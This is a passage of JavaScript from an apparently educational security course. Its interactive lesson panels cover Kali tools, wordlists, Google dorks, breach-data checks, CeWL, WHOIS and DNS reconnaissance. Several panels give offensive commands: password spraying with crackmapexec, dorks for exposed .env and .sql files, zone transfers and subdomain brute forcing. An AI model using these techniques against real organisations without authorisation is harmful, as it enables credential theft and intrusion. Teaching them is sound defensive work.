            workflow: 'FORENSIC INVESTIGATION WORKFLOW:\n\n1. ACQUISITION\n   ┌─────────────────────────────┐\n   │ Create forensic image       │\n   │ $ ewfacquire /dev/sdb       │\n   │ Verify hash integrity       │\n   └─────────────────────────────┘\n\n2. MOUNT READ-ONLY\n   ┌─────────────────────────────┐\n   │ $ mount -o ro,loop image.E01│\n   │ Never write to evidence!    │\n   └─────────────────────────────┘\n\n3. TIMELINE ANALYSIS\n   ┌─────────────────────────────┐\n   │ $ log2timeline.py timeline  │\n   │   /cases/disk.E01           │\n   │ $ psort.py -o l2tcsv timeline│\n   └─────────────────────────────┘\n\n4. ARTIFACT ANALYSIS\n   ┌─────────────────────────────┐\n   │ Autopsy for GUI browsing    │\n   │ RegRipper for registry      │\n   │ Volatility for memory       │\n   └─────────────────────────────┘\n\n5. DOCUMENT & REPORT'
        };
        $('#siftOut').textContent = data.sift;
        $$('#siftTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#siftTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#siftOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 21: kali-linux - Kali Linux
    function demoKaliLinux(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">OFFENSIVE</span><span class="demo-title">Kali Linux</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="kaliTabs">
                <button class="demo-btn demo-btn-sm active" data-t="overview">Overview</button>
                <button class="demo-btn demo-btn-sm" data-t="tools">Top Tools</button>
                <button class="demo-btn demo-btn-sm" data-t="setup">Setup</button>
            </div>
            <div id="kaliOut" style="background:#1e1e2e;color:#00ff88;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            overview: 'KALI LINUX:\n\n🔧 Purpose: Penetration Testing & Security Auditing\n📦 Based on: Debian Testing\n🏢 Maintainer: Offensive Security\n📅 First Release: 2013 (successor to BackTrack)\n\nKEY FEATURES:\n  ✓ 600+ security tools pre-installed\n  ✓ Free and open source\n  ✓ Customizable (metapackages)\n  ✓ ARM support (Raspberry Pi)\n  ✓ Multiple desktops (XFCE default)\n\nDEPLOYMENT OPTIONS:\n  • Live USB (persistent optional)\n  • Virtual Machine (VMware/VBox)\n  • WSL2 (Windows Subsystem Linux)\n  • Docker container\n  • Bare metal install\n  • Cloud (AWS, Azure, GCP)\n\n⚠️ NOT for daily desktop use!',
            tools: 'TOP KALI TOOLS BY CATEGORY:\n\n┌─────────────────────────────────────┐\n│ INFORMATION GATHERING               │\n│ • nmap, masscan (port scanning)     │\n│ • recon-ng, maltego (OSINT)         │\n│ • theHarvester (email/subdomain)    │\n├─────────────────────────────────────┤\n│ VULNERABILITY ANALYSIS              │\n│ • OpenVAS, Nessus (scanners)        │\n│ • nikto (web server scanner)        │\n│ • wpscan (WordPress)                │\n├─────────────────────────────────────┤\n│ WEB APPLICATIONS                    │\n│ • Burp Suite (interception proxy)   │\n│ • sqlmap (SQL injection)            │\n│ • dirb, gobuster (directory enum)   │\n├─────────────────────────────────────┤\n│ EXPLOITATION                        │\n│ • Metasploit Framework              │\n│ • searchsploit (exploit-db)         │\n│ • social engineering toolkit        │\n├─────────────────────────────────────┤\n│ POST-EXPLOITATION                   │\n│ • mimikatz (credentials)            │\n│ • empire, covenant (C2)             │\n└─────────────────────────────────────┘',
            setup: 'KALI SETUP BEST PRACTICES:\n\n1. RECOMMENDED: Virtual Machine\n   • Download OVA from kali.org\n   • Import into VMware/VirtualBox\n   • Allocate 4GB+ RAM, 50GB disk\n\n2. FIRST STEPS:\n   ┌─────────────────────────────┐\n   │ # Update system             │\n   │ $ sudo apt update           │\n   │ $ sudo apt full-upgrade -y  │\n   │                             │\n   │ # Change default password   │\n   │ $ passwd                    │\n   │                             │\n   │ # Take VM snapshot          │\n   │ (Before any testing)        │\n   └─────────────────────────────┘\n\n3. TOOL CATEGORIES (metapackages):\n   $ apt search kali-tools-\n   kali-tools-web\n   kali-tools-wireless\n   kali-tools-forensics\n   kali-tools-exploitation\n\n4. DOCUMENTATION:\n   https://www.kali.org/docs/'
        };
        $('#kaliOut').textContent = data.overview;
        $$('#kaliTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#kaliTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#kaliOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 22: wordlists-security - Wordlists in Security
    function demoWordlistsSecurity(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-warning">WORDLISTS</span><span class="demo-title">Wordlists in Security</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="wordlistTabs">
                <button class="demo-btn demo-btn-sm active" data-t="intro">Introduction</button>
                <button class="demo-btn demo-btn-sm" data-t="types">Types</button>
                <button class="demo-btn demo-btn-sm" data-t="sources">Sources</button>
            </div>
            <div id="wordlistOut" style="background:#1e1e2e;color:#ffcc80;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            intro: 'WORDLISTS IN SECURITY:\n\nText files containing potential values\nfor security testing:\n\n┌─────────────────────────────────────┐\n│ password123                         │\n│ admin                               │\n│ letmein                             │\n│ qwerty                              │\n│ 123456                              │\n│ ...                                 │\n└─────────────────────────────────────┘\n\nUSE CASES:\n  🔓 Password cracking\n  🌐 Directory/file bruteforcing\n  📧 Username enumeration\n  🔍 Subdomain discovery\n  🕵️ Fuzzing web applications\n\nKALI WORDLISTS LOCATION:\n  /usr/share/wordlists/\n\n⚠️ Only use for authorized testing!',
            types: 'TYPES OF WORDLISTS:\n\n┌─────────────────────────────────────┐\n│ PASSWORD LISTS                      │\n│ • rockyou.txt (14M passwords)       │\n│ • Common passwords from breaches    │\n│ • Keyboard patterns                 │\n├─────────────────────────────────────┤\n│ DIRECTORY/FILE LISTS                │\n│ • common.txt, directory-list-*      │\n│ • Web app paths, configs            │\n│ • Backup file extensions            │\n├─────────────────────────────────────┤\n│ USERNAME LISTS                      │\n│ • Common names                      │\n│ • Email formats (first.last, etc.)  │\n│ • Service accounts                  │\n├─────────────────────────────────────┤\n│ SUBDOMAIN LISTS                     │\n│ • Common subdomains (www, mail)     │\n│ • Cloud service names               │\n│ • Geographic patterns               │\n├─────────────────────────────────────┤\n│ CUSTOM LISTS                        │\n│ • Target-specific (CeWL output)     │\n│ • Mutated variations                │\n│ • Locale-specific words             │\n└─────────────────────────────────────┘',
            sources: 'POPULAR WORDLIST SOURCES:\n\n📂 SECLISTS:\n   GitHub: danielmiessler/SecLists\n   Comprehensive collection\n   Organized by category\n\n📂 ROCKYOU:\n   Classic password list\n   From 2009 breach\n   /usr/share/wordlists/rockyou.txt.gz\n   $ gzip -d rockyou.txt.gz\n\n📂 ASSETNOTE:\n   wordlists.assetnote.io\n   Web-focused lists\n   Regularly updated\n\n📂 FUZZDB:\n   Attack patterns\n   Error messages\n   Fuzzing payloads\n\n🔧 CREATING CUSTOM LISTS:\n\n  # From website (CeWL)\n  $ cewl https://target.com -w custom.txt\n\n  # Mutations (hashcat)\n  $ hashcat base.txt -r rules.rule --stdout\n\n  # Combine & dedupe\n  $ cat *.txt | sort -u > combined.txt'
        };
        $('#wordlistOut').textContent = data.intro;
        $$('#wordlistTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#wordlistTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#wordlistOut').textContent = data[b.dataset.t];
            };
        });
    }

    // Backward compatibility for demoSecurityDistros
    function demoSecurityDistros(pane) { demoSecurityDistrosIntro(pane); }

    // C9 Lesson 23: recon-intro - Reconnaissance Introduction
    function demoReconIntro(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">RECON</span><span class="demo-title">Reconnaissance Introduction</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="reconIntroTabs">
                <button class="demo-btn demo-btn-sm active" data-t="what">What is Recon?</button>
                <button class="demo-btn demo-btn-sm" data-t="types">Active vs Passive</button>
                <button class="demo-btn demo-btn-sm" data-t="phases">Phases</button>
            </div>
            <div id="reconIntroOut" style="background:#0d1117;color:#58a6ff;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            what: 'WHAT IS RECONNAISSANCE?\n\nThe first phase of any security assessment\nor attack: Information gathering\n\n"Give me six hours to chop down a tree\n and I will spend the first four\n sharpening the axe." - Lincoln\n\nGOAL:\n  Collect as much information about\n  the target as possible BEFORE testing\n\nINFORMATION TARGETS:\n  🏢 Organization details\n  👤 Employee information\n  🌐 Network infrastructure\n  💻 Technology stack\n  📧 Email addresses\n  🔑 Credentials (from breaches)\n  📱 Social media presence\n\n⚠️ Passive recon is generally legal\n   Active recon may require authorization',
            types: 'PASSIVE VS ACTIVE RECONNAISSANCE:\n\n┌─────────────────────────────────────┐\n│ PASSIVE (OSINT)                     │\n├─────────────────────────────────────┤\n│ No direct target contact            │\n│ Publicly available information      │\n│ Generally legal                     │\n│                                     │\n│ Examples:                           │\n│ • Google searches                   │\n│ • Social media                      │\n│ • Public records                    │\n│ • Job postings                      │\n│ • DNS lookups                       │\n└─────────────────────────────────────┘\n\n┌─────────────────────────────────────┐\n│ ACTIVE                              │\n├─────────────────────────────────────┤\n│ Direct target interaction           │\n│ May trigger detection               │\n│ Authorization required              │\n│                                     │\n│ Examples:                           │\n│ • Port scanning                     │\n│ • Vulnerability scanning            │\n│ • Social engineering calls          │\n│ • Network probing                   │\n└─────────────────────────────────────┘',
            phases: 'RECONNAISSANCE PHASES:\n\n1. DEFINE SCOPE\n   ┌─────────────────────────────┐\n   │ What systems are in scope?  │\n   │ What\'s out of bounds?       │\n   │ Legal considerations?       │\n   └─────────────────────────────┘\n\n2. PASSIVE INFORMATION GATHERING\n   ┌─────────────────────────────┐\n   │ OSINT, public records       │\n   │ No direct contact           │\n   └─────────────────────────────┘\n\n3. ACTIVE INFORMATION GATHERING\n   ┌─────────────────────────────┐\n   │ Scanning, probing           │\n   │ Direct interaction          │\n   └─────────────────────────────┘\n\n4. ANALYSIS & MAPPING\n   ┌─────────────────────────────┐\n   │ Correlate findings          │\n   │ Identify attack surface     │\n   │ Prioritize targets          │\n   └─────────────────────────────┘\n\n5. DOCUMENTATION\n   ┌─────────────────────────────┐\n   │ Record everything           │\n   │ Keep organized notes        │\n   └─────────────────────────────┘'
        };
        $('#reconIntroOut').textContent = data.what;
        $$('#reconIntroTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#reconIntroTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#reconIntroOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 24: google-dorking-robots - Google Dorking & robots.txt
    function demoGoogleDorking(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-warning">OSINT</span><span class="demo-title">Google Dorking & robots.txt</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="dorkTabs">
                <button class="demo-btn demo-btn-sm active" data-t="dorks">Google Dorks</button>
                <button class="demo-btn demo-btn-sm" data-t="robots">robots.txt</button>
                <button class="demo-btn demo-btn-sm" data-t="examples">Examples</button>
            </div>
            <div id="dorkOut" style="background:#0d1117;color:#ffd54f;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            dorks: 'GOOGLE DORKING:\n\nAdvanced search operators to find\nsensitive information indexed by Google\n\nCOMMON OPERATORS:\n\n  site:        - Limit to domain\n               site:example.com\n\n  filetype:    - Find specific files\n               filetype:pdf\n\n  intitle:     - Words in page title\n               intitle:"index of"\n\n  inurl:       - Words in URL\n               inurl:admin\n\n  intext:      - Words in page body\n               intext:password\n\n  ext:         - File extension\n               ext:sql\n\n  cache:       - Cached version\n               cache:example.com\n\n⚠️ Accessing found sensitive data\n   without authorization is illegal!',
            robots: 'ROBOTS.TXT ANALYSIS:\n\nFile that tells search engines what\nNOT to index - goldmine for recon!\n\nLOCATION:\n  https://target.com/robots.txt\n\nSAMPLE ROBOTS.TXT:\n┌─────────────────────────────────────┐\n│ User-agent: *                       │\n│ Disallow: /admin/                   │\n│ Disallow: /backup/                  │\n│ Disallow: /config/                  │\n│ Disallow: /private/                 │\n│ Disallow: /api/internal/            │\n│ Disallow: /*.sql$                   │\n│ Disallow: /wp-admin/                │\n│ Sitemap: /sitemap.xml               │\n└─────────────────────────────────────┘\n\n🎯 WHAT THIS REVEALS:\n   • Admin panel location\n   • Backup directory exists\n   • Internal API endpoints\n   • Tech stack (WordPress)',
            examples: 'PRACTICAL GOOGLE DORK EXAMPLES:\n\n🔍 FIND LOGIN PAGES:\n   site:target.com inurl:login\n   site:target.com intitle:login\n\n🔍 FIND EXPOSED FILES:\n   site:target.com filetype:sql\n   site:target.com filetype:env\n   site:target.com filetype:log\n   site:target.com ext:bak\n\n🔍 FIND DIRECTORIES:\n   site:target.com intitle:"index of"\n   site:target.com intitle:"directory listing"\n\n🔍 FIND SENSITIVE INFO:\n   site:target.com "confidential"\n   site:target.com "internal use only"\n   site:target.com filetype:xlsx\n\n🔍 FIND TECH STACK:\n   site:target.com "powered by"\n   site:target.com inurl:wp-content\n   site:target.com "PHP error"\n\n📚 GHDB (Google Hacking Database):\n   exploit-db.com/google-hacking-database'
        };
        $('#dorkOut').textContent = data.dorks;
        $$('#dorkTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#dorkTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#dorkOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 25: job-posting-osint - Job Posting OSINT
    function demoJobPostingOsint(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">OSINT</span><span class="demo-title">Job Posting OSINT</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="jobOsintTabs">
                <button class="demo-btn demo-btn-sm active" data-t="why">Why Job Postings?</button>
                <button class="demo-btn demo-btn-sm" data-t="find">What to Find</button>
                <button class="demo-btn demo-btn-sm" data-t="example">Example Analysis</button>
            </div>
            <div id="jobOsintOut" style="background:#0d1117;color:#8b949e;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            why: 'WHY JOB POSTINGS ARE VALUABLE:\n\nCompanies reveal infrastructure details\nin technical job requirements:\n\n┌─────────────────────────────────────┐\n│ "Looking for DevOps Engineer with   │\n│  experience in:                     │\n│  • AWS (EC2, S3, Lambda)            │\n│  • Kubernetes, Docker               │\n│  • Jenkins CI/CD                    │\n│  • PostgreSQL, Redis                │\n│  • Terraform, Ansible               │\n│  • Datadog monitoring"              │\n└─────────────────────────────────────┘\n\n🎯 NOW WE KNOW:\n   • Cloud provider: AWS\n   • Container orchestration: K8s\n   • CI/CD system: Jenkins\n   • Databases: PostgreSQL, Redis\n   • IaC tools: Terraform, Ansible\n   • Monitoring: Datadog\n\nThis info helps target specific vulns!',
            find: 'INFORMATION FROM JOB POSTINGS:\n\n┌─────────────────────────────────────┐\n│ TECHNOLOGY STACK                    │\n│ • Programming languages             │\n│ • Frameworks (React, Django, etc.)  │\n│ • Databases                         │\n│ • Cloud providers                   │\n├─────────────────────────────────────┤\n│ SECURITY TOOLS                      │\n│ • SIEM (Splunk, ELK?)               │\n│ • EDR (CrowdStrike, Carbon Black?)  │\n│ • Network security (Palo Alto?)     │\n├─────────────────────────────────────┤\n│ ORGANIZATIONAL STRUCTURE            │\n│ • Team sizes                        │\n│ • Reporting structures              │\n│ • Office locations                  │\n├─────────────────────────────────────┤\n│ CONTACT INFORMATION                 │\n│ • Recruiter emails                  │\n│ • HR contacts                       │\n│ • Employee names                    │\n└─────────────────────────────────────┘',
            example: 'EXAMPLE JOB POSTING ANALYSIS:\n\n📋 "Senior Security Engineer"\n\nREQUIREMENTS (What we learn):\n\n"Experience with Palo Alto firewalls"\n  → Network security vendor known\n\n"CrowdStrike Falcon administration"\n  → EDR solution identified\n\n"Splunk Enterprise Security"\n  → SIEM platform known\n\n"Okta identity management"\n  → SSO provider identified\n\n"AWS Security Hub, GuardDuty"\n  → Cloud is AWS, security tools known\n\n"Terraform and CloudFormation"\n  → Infrastructure as Code tools\n\n🎯 ATTACK SURFACE NOW CLEARER:\n   • Look for Okta misconfigurations\n   • Research CrowdStrike bypasses\n   • Check AWS-specific vulnerabilities\n   • Target Splunk for log access\n\n📍 WHERE TO FIND:\n   LinkedIn, Indeed, Glassdoor, company careers'
        };
        $('#jobOsintOut').textContent = data.why;
        $$('#jobOsintTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#jobOsintTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#jobOsintOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 26: cewl-wordlists - CeWL for Custom Wordlists
    function demoCewlWordlists(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-success">TOOL</span><span class="demo-title">CeWL - Custom Wordlist Generator</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="cewlTabs">
                <button class="demo-btn demo-btn-sm active" data-t="what">What is CeWL?</button>
                <button class="demo-btn demo-btn-sm" data-t="usage">Usage</button>
                <button class="demo-btn demo-btn-sm" data-t="options">Options</button>
            </div>
            <div id="cewlOut" style="background:#0d1117;color:#7ee787;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            what: 'CeWL - CUSTOM WORD LIST GENERATOR:\n\nCrawls websites and creates wordlists\nfrom the actual content on pages.\n\nWHY CeWL?\n  Generic wordlists (rockyou) miss\n  organization-specific terms:\n\n  • Company name variations\n  • Product names\n  • Employee names\n  • Industry jargon\n  • Location-specific terms\n\nEXAMPLE:\n  Target: example-corp.com\n\n  CeWL finds: ExampleCorp, Example2024,\n  NewYorkOffice, ProductX, CEO_Smith...\n\n  These make better passwords than\n  generic "password123"\n\n📦 Pre-installed on Kali Linux\n   Package: cewl',
            usage: 'CeWL BASIC USAGE:\n\n# Basic crawl - output to terminal\n$ cewl https://target.com\n\n# Save to file\n$ cewl https://target.com -w wordlist.txt\n\n# Crawl depth (default: 2)\n$ cewl https://target.com -d 3 -w words.txt\n\n# Minimum word length (default: 3)\n$ cewl https://target.com -m 6 -w words.txt\n\n# Include email addresses\n$ cewl https://target.com -e -w words.txt\n\nSAMPLE OUTPUT:\n┌─────────────────────────────────────┐\n│ ExampleCorp                         │\n│ solutions                           │\n│ enterprise                          │\n│ innovation                          │\n│ customer                            │\n│ platform                            │\n│ services                            │\n│ security                            │\n└─────────────────────────────────────┘',
            options: 'CeWL ADVANCED OPTIONS:\n\n# Verbose output\n$ cewl -v https://target.com\n\n# Follow external links\n$ cewl --offsite https://target.com\n\n# Custom user-agent\n$ cewl -u "Mozilla/5.0..." https://target.com\n\n# With authentication\n$ cewl --auth_type basic \\\n       --auth_user admin \\\n       --auth_pass secret \\\n       https://target.com\n\n# Include numbers in words\n$ cewl -n https://target.com\n\n# Extract metadata from files\n$ cewl --meta https://target.com\n\nCOMBINING WITH OTHER TOOLS:\n\n# Mutate with hashcat rules\n$ cewl https://target.com -w base.txt\n$ hashcat base.txt -r best64.rule \\\n          --stdout > mutated.txt\n\n# Use for password spraying\n$ cewl https://target.com -w passwords.txt\n$ crackmapexec smb 10.0.0.1 -u users.txt \\\n               -p passwords.txt'
        };
        $('#cewlOut').textContent = data.what;
        $$('#cewlTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#cewlTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#cewlOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 27: prior-breaches - Checking Prior Breaches
    function demoPriorBreaches(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">BREACH</span><span class="demo-title">Checking Prior Breaches</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="breachTabs">
                <button class="demo-btn demo-btn-sm active" data-t="why">Why Check Breaches?</button>
                <button class="demo-btn demo-btn-sm" data-t="tools">Tools & Services</button>
                <button class="demo-btn demo-btn-sm" data-t="usage">Using the Data</button>
            </div>
            <div id="breachOut" style="background:#0d1117;color:#ff7b72;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            why: 'WHY CHECK PRIOR BREACHES?\n\nPeople reuse passwords across services:\n\n┌─────────────────────────────────────┐\n│ LinkedIn breach (2012):             │\n│   john.doe@example.com : Summer2012!│\n│                                     │\n│ Target corporate login:             │\n│   john.doe@example.com : Summer2012!│\n│   (Same password!)                  │\n└─────────────────────────────────────┘\n\nSTATISTICS:\n  • 65% of people reuse passwords\n  • 13% use same password everywhere\n  • 49% just increment numbers\n\nPEN TEST USE CASES:\n  ✓ Check if target emails in breaches\n  ✓ Use found passwords for spraying\n  ✓ Identify password patterns\n  ✓ Build target-specific wordlists\n\n⚠️ Ethical considerations apply!\n   Only use with authorization.',
            tools: 'BREACH CHECK TOOLS & SERVICES:\n\n┌─────────────────────────────────────┐\n│ FREE / LEGITIMATE                   │\n├─────────────────────────────────────┤\n│ haveibeenpwned.com                  │\n│  - Check emails in breaches         │\n│  - API available                    │\n│  - Ethical service by Troy Hunt     │\n│                                     │\n│ dehashed.com (limited free)         │\n│  - Search by email, username, IP    │\n│                                     │\n│ intelx.io (Intelligence X)          │\n│  - Comprehensive data source        │\n│                                     │\n│ breachdirectory.org                 │\n│  - Partial password reveals         │\n├─────────────────────────────────────┤\n│ COMMAND LINE                        │\n├─────────────────────────────────────┤\n│ h8mail                              │\n│  - OSINT & breach hunting tool      │\n│  $ h8mail -t target@example.com     │\n│                                     │\n│ pwndb (via Tor)                     │\n│  - Dark web breach database         │\n└─────────────────────────────────────┘',
            usage: 'USING BREACH DATA RESPONSIBLY:\n\n✅ LEGITIMATE PEN TEST USE:\n\n1. IDENTIFY EXPOSED ACCOUNTS:\n   $ h8mail -t @targetcorp.com\n\n   Results:\n   john@targetcorp.com - Found in:\n     LinkedIn (2012), Adobe (2013)\n\n2. ANALYZE PASSWORD PATTERNS:\n   Found passwords follow pattern:\n   [Name][Year][Symbol]\n   → John2012!, Jane2013#\n\n3. CREATE TARGETED WORDLIST:\n   Combine with employee names:\n   Mike2024!, Mike2024@, Mike2024#...\n\n4. PASSWORD SPRAY (AUTHORIZED):\n   $ crackmapexec smb target -u users.txt\n                 -p targeted.txt\n\n❌ NEVER:\n   • Access systems without authorization\n   • Use for personal gain\n   • Share breach data publicly\n   • Ignore legal boundaries'
        };
        $('#breachOut').textContent = data.why;
        $$('#breachTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#breachTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#breachOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 28: whois-lookup - WHOIS Lookup
    function demoWhoisLookup(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">DNS</span><span class="demo-title">WHOIS Lookup</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="whoisTabs">
                <button class="demo-btn demo-btn-sm active" data-t="what">What is WHOIS?</button>
                <button class="demo-btn demo-btn-sm" data-t="usage">Usage</button>
                <button class="demo-btn demo-btn-sm" data-t="info">Information Found</button>
            </div>
            <div id="whoisOut" style="background:#0d1117;color:#a5d6ff;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            what: 'WHAT IS WHOIS?\n\nProtocol for querying databases that\nstore domain registration information.\n\n┌─────────────────────────────────────┐\n│ WHOIS DATABASE                      │\n│                                     │\n│ Domain: example.com                 │\n│ Registrar: GoDaddy                  │\n│ Created: 1995-08-15                 │\n│ Expires: 2025-08-14                 │\n│ Registrant: Example Corp            │\n│ Contact: admin@example.com          │\n│ Name Servers: ns1.example.com       │\n└─────────────────────────────────────┘\n\nREGISTRY TYPES:\n  • Generic TLDs (.com, .net, .org)\n  • Country code TLDs (.uk, .de, .jp)\n  • Regional Internet Registries (IPs)\n\n⚠️ GDPR reduced available information\n   for many EU registrations.',
            usage: 'WHOIS USAGE:\n\nCOMMAND LINE:\n  $ whois example.com\n\n  $ whois 93.184.216.34\n\nONLINE TOOLS:\n  • whois.domaintools.com\n  • who.is\n  • whois.icann.org\n  • lookup.icann.org\n\nFOR IP ADDRESSES:\n  $ whois 8.8.8.8\n\n  Or use Regional Registries:\n  • ARIN (North America)\n  • RIPE (Europe)\n  • APNIC (Asia-Pacific)\n  • LACNIC (Latin America)\n  • AFRINIC (Africa)\n\nAUTOMATED TOOLS:\n  $ amass intel -whois -d example.com\n\n  $ recon-ng\n  > use recon/domains-contacts/whois_pocs',
            info: 'INFORMATION FROM WHOIS:\n\n┌─────────────────────────────────────┐\n│ REGISTRANT DETAILS                  │\n│ • Organization name                 │\n│ • Contact person (if not private)   │\n│ • Email addresses                   │\n│ • Phone numbers                     │\n│ • Physical address                  │\n├─────────────────────────────────────┤\n│ TECHNICAL DETAILS                   │\n│ • Name servers (DNS)                │\n│ • Creation date                     │\n│ • Expiration date                   │\n│ • Last update date                  │\n│ • Registrar information             │\n├─────────────────────────────────────┤\n│ SECURITY IMPLICATIONS               │\n│ • Identify related domains          │\n│ • Find admin contacts for SE        │\n│ • Discover hosting providers        │\n│ • Check domain history              │\n│ • Expiring domains = opportunity    │\n└─────────────────────────────────────┘\n\n📍 HISTORICAL WHOIS:\n   whoishistory.com, DomainTools'
        };
        $('#whoisOut').textContent = data.what;
        $$('#whoisTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#whoisTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#whoisOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 29: dns-recon - DNS Reconnaissance
    function demoDnsRecon(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-warning">DNS</span><span class="demo-title">DNS Reconnaissance</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="dnsReconTabs">
                <button class="demo-btn demo-btn-sm active" data-t="records">DNS Records</button>
                <button class="demo-btn demo-btn-sm" data-t="enum">Enumeration</button>
                <button class="demo-btn demo-btn-sm" data-t="tools">Tools</button>
            </div>
            <div id="dnsReconOut" style="background:#0d1117;color:#ffa657;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            records: 'DNS RECORD TYPES FOR RECON:\n\n┌──────┬──────────────────────────────┐\n│ A    │ IPv4 address                 │\n│ AAAA │ IPv6 address                 │\n│ MX   │ Mail servers                 │\n│ NS   │ Name servers                 │\n│ TXT  │ Text records (SPF, DKIM)     │\n│ CNAME│ Canonical name (aliases)     │\n│ SOA  │ Start of Authority           │\n│ PTR  │ Reverse DNS                  │\n│ SRV  │ Service records              │\n└──────┴──────────────────────────────┘\n\nQUERY EXAMPLES:\n  $ dig example.com A\n  $ dig example.com MX\n  $ dig example.com TXT\n  $ dig example.com ANY\n\n  $ nslookup -type=mx example.com\n\n  $ host -t ns example.com',
            enum: 'DNS ENUMERATION TECHNIQUES:\n\n1. ZONE TRANSFER (if misconfigured)\n   $ dig axfr @ns1.example.com example.com\n\n   Success = Complete DNS dump!\n   (Usually blocked)\n\n2. SUBDOMAIN BRUTE FORCE\n   $ gobuster dns -d example.com \\\n             -w /usr/share/seclists/Discovery/\\\n                DNS/subdomains-top1million-5000.txt\n\n3. REVERSE DNS SWEEP\n   $ dnsrecon -r 192.168.1.0/24\n\n4. DNS CACHE SNOOPING\n   Check what domains were queried\n\n5. CERTIFICATE TRANSPARENCY\n   Search crt.sh for issued certs\n   Reveals subdomains!\n\nFINDINGS:\n  www.example.com    → Main website\n  mail.example.com   → Email server\n  vpn.example.com    → VPN endpoint\n  dev.example.com    → Dev environment\n  api.example.com    → API endpoint',
